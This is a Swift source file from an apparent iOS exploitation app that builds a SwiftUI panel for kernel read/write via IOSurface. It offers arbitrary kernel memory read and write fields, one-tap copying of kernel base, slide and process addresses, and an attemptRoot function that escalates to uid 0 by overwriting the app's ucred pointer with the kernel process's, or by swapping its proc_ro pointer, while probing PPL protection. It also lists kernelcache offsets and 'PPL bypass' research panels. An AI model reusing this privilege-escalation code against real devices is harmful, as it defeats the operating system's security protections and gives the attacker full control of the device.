//
//  BleedingEdgeIOSurfaceKRW.swift
//  DSPloit
//
//  IOSurface KRW Research & Exploitation View
//  Created by Royan
//

import SwiftUI

struct BleedingEdgeIOSurfaceKRWView: View {
    @ObservedObject private var engine = IOSurfaceKRWEngine.shared
    @ObservedObject private var mgr = dspmgr.shared
    
    @State private var resultMsg = ""
    @State private var gxfReport = ""
    @State private var dmaReport = ""
    @State private var readAddr = ""
    @State private var readResult = ""
    @State private var writeAddr = ""
    @State private var writeVal = ""
    @State private var writeResult = ""
    @State private var rootResult = ""
    
    var body: some View {
        List {
            // Status
            Section(header: HeaderLabel(text: "IOSurface KRW Status", icon: "cpu")) {
                HStack {
                    StatusIndicator(active: mgr.dsready, label: "Kernel")
                    Spacer()
                    StatusIndicator(active: mgr.sbxready, label: "Sandbox")
                    Spacer()
                    StatusIndicator(active: engine.isReady, label: "IOSurface")
                }
                
                if engine.surfaceID != 0 {
                    VStack(alignment: .leading, spacing: 4) {
                        InfoRow(label: "Surface ID", value: "\(engine.surfaceID)", color: .cyan)
                        InfoRow(label: "Mapped Addr", value: String(format: "0x%llx", engine.mappedAddress), color: .green)
                    }
                }
            }
            
            // Initialize
            Section(header: HeaderLabel(text: "Initialize", icon: "bolt.fill")) {
                Button(action: {
                    let result = engine.openIOSurfaceRoot()
                    resultMsg = result.message
                }) {
                    HStack {
                        Image(systemName: "play.circle.fill")
                        Text("Open IOSurfaceRoot")
                        Spacer()
                        if engine.isReady {
                            Image(systemName: "checkmark.circle.fill")
                                .foregroundStyle(.green)
                        }
                    }
                }
                .disabled(!mgr.dsready || !mgr.sbxready)
                
                if !mgr.sbxready {
                    PlainAlert(
                        title: "Requires Sandbox Escape",
                        icon: "lock.fill",
                        text: "Run sandbox escape first (Main tab → Initialize System)",
                        color: .orange
                    )
                }
            }
            
            // Quick Address Buttons (tap to copy or auto-fill)
            Section(header: HeaderLabel(text: "Quick Addresses (tap to paste)", icon: "doc.on.clipboard")) {
                Button(action: {
                    let addr = String(format: "0x%llx", mgr.kernbase)
                    readAddr = addr
                    UIPasteboard.general.string = addr
                }) {
                    HStack {
                        Text("kernel_base")
                            .font(.caption)
                        Spacer()
                        Text(String(format: "0x%llx", mgr.kernbase))
                            .font(.system(size: 11, design: .monospaced))
                            .foregroundStyle(.cyan)
                        Image(systemName: "doc.on.doc")
                            .foregroundStyle(.blue)
                    }
                }
                .disabled(!mgr.dsready)
                
                Button(action: {
                    let addr = String(format: "0x%llx", mgr.kernslide)
                    UIPasteboard.general.string = addr
                }) {
                    HStack {
                        Text("kernel_slide")
                            .font(.caption)
                        Spacer()
                        Text(String(format: "0x%llx", mgr.kernslide))
                            .font(.system(size: 11, design: .monospaced))
                            .foregroundStyle(.orange)
                        Image(systemName: "doc.on.doc")
                            .foregroundStyle(.blue)
                    }
                }
                .disabled(!mgr.dsready)
                
                Button(action: {
                    let proc = ds_get_our_proc()
                    let addr = String(format: "0x%llx", proc)
                    readAddr = addr
                    UIPasteboard.general.string = addr
                }) {
                    HStack {
                        Text("our_proc")
                            .font(.caption)
                        Spacer()
                        Text(mgr.dsready ? String(format: "0x%llx", ds_get_our_proc()) : "—")
                            .font(.system(size: 11, design: .monospaced))
                            .foregroundStyle(.green)
                        Image(systemName: "doc.on.doc")
                            .foregroundStyle(.blue)
                    }
                }
                .disabled(!mgr.dsready)
                
                Button(action: {
                    let task = ds_get_our_task()
                    let addr = String(format: "0x%llx", task)
                    readAddr = addr
                    UIPasteboard.general.string = addr
                }) {
                    HStack {
                        Text("our_task")
                            .font(.caption)
                        Spacer()
                        Text(mgr.dsready ? String(format: "0x%llx", ds_get_our_task()) : "—")
                            .font(.system(size: 11, design: .monospaced))
                            .foregroundStyle(.green)
                        Image(systemName: "doc.on.doc")
                            .foregroundStyle(.blue)
                    }
                }
                .disabled(!mgr.dsready)
            }
            
            // Read Test
            Section(header: HeaderLabel(text: "Memory Read (via IOSurface)", icon: "magnifyingglass")) {
                TextField("Address (hex)", text: $readAddr)
                    .font(.system(.body, design: .monospaced))
                
                Button("Read 8 bytes") {
                    guard let addr = UInt64(readAddr.replacingOccurrences(of: "0x", with: ""), radix: 16) else { return }
                    let val = engine.propertyRead(address: addr)
                    readResult = String(format: "0x%llx = 0x%016llx", addr, val)
                }
                .disabled(!mgr.dsready)
                
                if !readResult.isEmpty {
                    Text(readResult)
                        .font(.system(size: 11, design: .monospaced))
                        .foregroundStyle(.green)
                        .textSelection(.enabled)
                }
            }
            
            // Write Test
            Section(header: HeaderLabel(text: "Memory Write", icon: "pencil.line")) {
                TextField("Write Address (hex)", text: $writeAddr)
                    .font(.system(.body, design: .monospaced))
                TextField("Value (hex)", text: $writeVal)
                    .font(.system(.body, design: .monospaced))
                
                Button("Write 8 bytes") {
                    guard let addr = UInt64(writeAddr.replacingOccurrences(of: "0x", with: ""), radix: 16),
                          let val = UInt64(writeVal.replacingOccurrences(of: "0x", with: ""), radix: 16) else { return }
                    engine.propertyWrite(address: addr, value: val)
                    // Read back to verify
                    let readBack = engine.propertyRead(address: addr)
                    writeResult = String(format: "Wrote 0x%llx → 0x%llx\nRead back: 0x%016llx\n%@",
                                        val, addr, readBack,
                                        readBack == val ? "✅ SUCCESS" : "❌ BLOCKED (PPL?)")
                }
                .disabled(!mgr.dsready)
                .foregroundStyle(.red)
                
                if !writeResult.isEmpty {
                    Text(writeResult)
                        .font(.system(size: 11, design: .monospaced))
                        .foregroundStyle(writeResult.contains("SUCCESS") ? .green : .red)
                        .textSelection(.enabled)
                }
            }
            
            // One-tap Root Attempt
            Section(header: HeaderLabel(text: "⚡ Root Escalation Test", icon: "bolt.shield.fill")) {
                Button(action: attemptRoot) {
                    HStack {
                        Image(systemName: "person.badge.key.fill")
                        Text("Attempt uid=0 (Root)")
                        Spacer()
                        Image(systemName: "exclamationmark.triangle.fill")
                            .foregroundStyle(.orange)
                    }
                    .foregroundStyle(.red)
                }
                .disabled(!mgr.dsready)
                
                if !rootResult.isEmpty {
                    Text(rootResult)
                        .font(.system(size: 11, design: .monospaced))
                        .foregroundStyle(rootResult.contains("SUCCESS") ? .green : .orange)
                        .textSelection(.enabled)
                }
                
                Text("Writes uid=0 to ucred. PPL may block this.")
                    .font(.caption2)
                    .foregroundStyle(.secondary)
            }
            
            // Research: GXF Entry
            Section(header: HeaderLabel(text: "GXF Entry Research", icon: "shield.lefthalf.filled")) {
                Button("Generate GXF Report") {
                    gxfReport = engine.researchGXFEntry()
                }
                
                if !gxfReport.isEmpty {
                    Text(gxfReport)
                        .font(.system(size: 10, design: .monospaced))
                        .foregroundStyle(.cyan)
                        .textSelection(.enabled)
                }
            }
            
            // Research: DMA Bypass
            Section(header: HeaderLabel(text: "DMA PPL Bypass Research", icon: "bolt.shield")) {
                Button("Generate DMA Report") {
                    dmaReport = engine.researchDMABypass()
                }
                
                if !dmaReport.isEmpty {
                    Text(dmaReport)
                        .font(.system(size: 10, design: .monospaced))
                        .foregroundStyle(.orange)
                        .textSelection(.enabled)
                }
            }
            
            // Kernelcache Analysis Results
            Section(header: HeaderLabel(text: "Kernelcache Findings", icon: "doc.text.magnifyingglass")) {
                VStack(alignment: .leading, spacing: 6) {
                    Text("From deep_analyze_v3.py:")
                        .font(.caption.bold())
                    
                    InfoRow(label: "IOSurface strings", value: "762", color: .cyan)
                    InfoRow(label: "PPL checks (bit#14)", value: "223", color: .red)
                    InfoRow(label: "GXF accesses", value: "50", color: .orange)
                    InfoRow(label: "pmap functions", value: "7 with PPL checks", color: .purple)
                    
                    Text("\nKey addresses (file offsets):")
                        .font(.caption.bold())
                    
                    Group {
                        Text("GXF handler: 0xf0c440")
                        Text("PPL check #1: 0xe33e14")
                        Text("pmap_enter: 0x11126c0 (667 branches)")
                        Text("IOSurfaceRoot: 0x0067d03b (string)")
                        Text("Largest func: 0x155e280 (106KB)")
                    }
                    .font(.system(size: 9, design: .monospaced))
                    .foregroundStyle(.green)
                }
            }
            
            // Result
            if !resultMsg.isEmpty {
                Section(header: HeaderLabel(text: "Result", icon: "info.circle")) {
                    Text(resultMsg)
                        .font(.system(size: 11, design: .monospaced))
                        .foregroundStyle(engine.isReady ? .green : .red)
                        .textSelection(.enabled)
                }
            }
            
            // Log
            if !engine.statusLog.isEmpty {
                Section(header: HeaderLabel(text: "Log", icon: "terminal")) {
                    ForEach(engine.statusLog.suffix(20), id: \.self) { line in
                        Text(line)
                            .font(.system(size: 9, design: .monospaced))
                            .foregroundStyle(.secondary)
                    }
                }
            }
        }
        .navigationTitle("IOSurface KRW")
        .premiumStyling()
    }
    
    private func attemptRoot() {
        guard mgr.dsready else {
            rootResult = "Kernel not ready"
            return
        }
        
        let proc = ds_get_our_proc()
        guard proc != 0 else { rootResult = "proc = 0"; return }
        
        let procRoAddr = proc + UInt64(off_proc_p_proc_ro)
        let procRo = ds_kread64(procRoAddr)
        guard procRo != 0 else { rootResult = "proc_ro = 0"; return }
        
        let ucredAddr = procRo + UInt64(off_proc_ro_p_ucred)
        let ucred = ds_kread64(ucredAddr)
        guard ucred != 0 else { rootResult = "ucred = 0"; return }
        
        let origUid = ds_kread32(ucred + 0x18)
        
        var report = ""
        report += String(format: "proc:      0x%llx\n", proc)
        report += String(format: "proc_ro:   0x%llx\n", procRo)
        report += String(format: "ucred:     0x%llx\n", ucred)
        report += String(format: "orig uid:  %d\n", origUid)
        report += String(format: "rw_pcb:    0x%llx\n\n", ds_get_rw_socket_pcb())
        
        // ============================================================
        // STRATEGY: Test what's writable, step by step
        // Each test is SAFE — we only write values we can verify
        // and restore immediately if something goes wrong
        // ============================================================
        
        // --- TEST A: Can we write DIFFERENT value to proc_ro ucred field? ---
        report += "=== TEST A: Write to proc_ro ucred field ===\n"
        let origUcredPtr = ds_kread64(ucredAddr)
        // Write a DIFFERENT value to truly test (use kernel ucred as test)
        let kernProc0 = procbypid(0)
        let kernProcRo0 = ds_kread64(kernProc0 + UInt64(off_proc_p_proc_ro))
        let kernUcred0 = ds_kread64(kernProcRo0 + UInt64(off_proc_ro_p_ucred))
        
        ds_kwrite64(ucredAddr, kernUcred0)  // Try write kernel ucred ptr
        let verifyA = ds_kread64(ucredAddr)
        let procRoWritable = (verifyA == kernUcred0)
        
        if procRoWritable {
            // It actually worked! Check getuid
            let testUid = getuid()
            report += String(format: "proc_ro ucred field: TRULY WRITABLE ✅\n")
            report += String(format: "getuid() = %d\n", testUid)
            if testUid == 0 {
                report += "\n🎉🎉🎉 ROOT ACHIEVED! 🎉🎉🎉\n"
                rootResult = report
                return
            }
            // Restore if getuid didn't change
            ds_kwrite64(ucredAddr, origUcredPtr)
            report += "Restored (getuid didn't reflect change)\n\n"
        } else {
            report += String(format: "proc_ro ucred field: PPL BLOCKED ❌\n")
            report += String(format: "(wrote 0x%llx, read back 0x%llx)\n\n", kernUcred0, verifyA)
        }
        
        if !procRoWritable {
            // proc_ro is PPL protected — use proc_ro pointer swap
            report += "=== TEST B: proc_ro POINTER swap ===\n"
            report += "(proc_ro content is PPL-protected, but pointer in proc is not)\n\n"
            
            // We need safe heap memory for fake structures.
            // Use rw_socket_pcb + 0x200 area (after the icmp6 filter data)
            // This is KNOWN writable heap (our exploit uses it)
            let rwPcb = ds_get_rw_socket_pcb()
            guard rwPcb != 0 else {
                report += "❌ rw_socket_pcb = 0\n"
                rootResult = report
                return
            }
            
            // Safe offset: pcb is ~0x400 bytes, use +0x300 for our data
            // Actually this is risky too. Let's use a different approach:
            // Scan for a KNOWN EMPTY region near our proc
            
            // Better: just test if we can write to proc_ro[4] (ucred ptr)
            // by writing a DIFFERENT valid ucred pointer
            // We'll point it to kernel_proc's ucred (uid=0)
            
            report += "Looking for kernel_proc (pid=0) ucred...\n"
            let kernProc = kernProc0
            let kernProcRo = kernProcRo0
            let kernUcred = kernUcred0
            let kernUid = ds_kread32(kernUcred + 0x18)
            
            report += String(format: "kernel proc:    0x%llx\n", kernProc)
            report += String(format: "kernel proc_ro: 0x%llx\n", kernProcRo)
            report += String(format: "kernel ucred:   0x%llx\n", kernUcred)
            report += String(format: "kernel uid:     %d\n\n", kernUid)
            
            // Now: swap our proc_ro pointer to kernel's proc_ro
            // This gives us kernel's ucred (uid=0) without creating fake structs!
            report += "⚡ Swapping proc_ro → kernel proc_ro...\n"
            report += String(format: "   0x%llx → 0x%llx\n\n", procRo, kernProcRo)
            
            ds_kwrite64(procRoAddr, kernProcRo)
            
            // Verify
            let newProcRo = ds_kread64(procRoAddr)
            let newUcred = ds_kread64(newProcRo + UInt64(off_proc_ro_p_ucred))
            let newUid = ds_kread32(newUcred + 0x18)
            let realUid = getuid()
            
            report += String(format: "New proc_ro: 0x%llx\n", newProcRo)
            report += String(format: "New ucred:   0x%llx\n", newUcred)
            report += String(format: "Kernel uid:  %d\n", newUid)
            report += String(format: "getuid():    %d\n\n", realUid)
            
            if realUid == 0 {
                report += "🎉🎉🎉 ROOT ACHIEVED! 🎉🎉🎉\n"
                report += "getuid() = 0 — YOU ARE ROOT!\n"
            } else if newUid == 0 {
                report += "⚠️ Kernel chain shows uid=0 but getuid() still \(realUid)\n"
                report += "May need to also update task credentials.\n"
                // Don't restore — let user see the state
            } else {
                report += "❌ Swap didn't work or was reverted\n"
                // Restore
                ds_kwrite64(procRoAddr, procRo)
                report += "Restored original proc_ro.\n"
            }
        } else {
            // proc_ro IS writable — already handled above in Test A
            report += "Already handled in Test A above.\n"
        }
        
        rootResult = report
    }
}
